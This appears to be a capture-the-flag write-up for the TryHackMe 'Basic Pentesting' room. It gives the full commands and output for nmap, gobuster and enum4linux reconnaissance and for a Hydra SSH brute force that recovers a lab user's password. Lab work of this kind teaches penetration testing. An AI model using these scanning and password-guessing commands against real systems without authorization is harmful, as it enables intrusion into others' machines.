[TryHackMe - Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

- nmap scan reveals
- 22/tcp open 
- 80/http open
- 139/tcp open
- 445/tcp open
- 8009/tcp open
- 8080/tcp open

```bash
$ nmap -sC -sV -v 10.10.167.1
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 06:10 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating Ping Scan at 06:10
Scanning 10.10.167.1 [2 ports]
Completed Ping Scan at 06:10, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:10
Completed Parallel DNS resolution of 1 host. at 06:10, 0.02s elapsed
Initiating Connect Scan at 06:10
Scanning 10.10.167.1 [1000 ports]
Discovered open port 445/tcp on 10.10.167.1
Discovered open port 8080/tcp on 10.10.167.1
Discovered open port 22/tcp on 10.10.167.1
Discovered open port 80/tcp on 10.10.167.1
Discovered open port 139/tcp on 10.10.167.1
Discovered open port 8009/tcp on 10.10.167.1
Completed Connect Scan at 06:10, 12.11s elapsed (1000 total ports)
Initiating Service scan at 06:10
Scanning 6 services on 10.10.167.1
Completed Service scan at 06:10, 11.30s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.167.1.
Initiating NSE at 06:10
Completed NSE at 06:10, 3.56s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.45s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Nmap scan report for 10.10.167.1
Host is up (0.097s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db45cbbe4a8b71f8e93142aefff845e4 (RSA)
|_  256 a5682b225f984a62213da2e2c5a9f7c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-11-01T06:10:28-04:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2022-11-01T10:10:28
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

NSE: Script Post-scanning.
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Initiating NSE at 06:10
Completed NSE at 06:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.11 seconds

```
- Gobuster scan reveals /Development directory
- gobuster dir -u 10.10.163.240 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
- gobuster - command
- dir - directory
- -u - url
- 10.10.163.240 - ip
- -w - wordlist
- /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.-small.txt - wordlist location

```
~# gobuster dir -u 10.10.163.240 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.163.240
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/10/29 15:36:09 Starting gobuster
===============================================================
/development (Status: 301)
===============================================================
2022/10/29 15:36:18 Finished
===============================================================
```

- containing dev.txt and j.txt
    - dev.txt
    ```html 
    018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
    to host that on this server too. Haven't made any real web apps yet, but I have tried that example
    you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
    using version 2.5.12, because other versions were giving me trouble. -K

    2018-04-22: SMB has been configured. -K

    2018-04-21: I got Apache set up. Will put in our content later. -J
    ```

    - j.txt
    ```html
    For J:

    I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
    and I was able to crack your hash really easily. You know our password policy, so please follow
    it? Change that password ASAP.

    -K
    ```

- enum4linux reveals users named kay and jan
```bash
~# enum4linux -a -d 10.10.148.235
...
S-1-5-21-2853212168-2008227510-3551253869-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)#
Use of uninitialized value $user_info in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 936.

S-1-22-1-1001 Unix User\jan (Local User)
Use of uninitialized value $user_info in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 936.

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
...

```

- Hydra scan for passwords
- found User - jan and Password - armando

```bash
~# hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.148.235
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-10-29 17:16:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.148.235:22/
[STATUS] 261.00 tries/min, 261 tries in 00:01h, 14344142 to do in 915:59h, 16 active
[STATUS] 248.00 tries/min, 744 tries in 00:03h, 14343659 to do in 963:58h, 16 active
[22][ssh] host: 10.10.148.235   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2022-10-29 17:19:30

```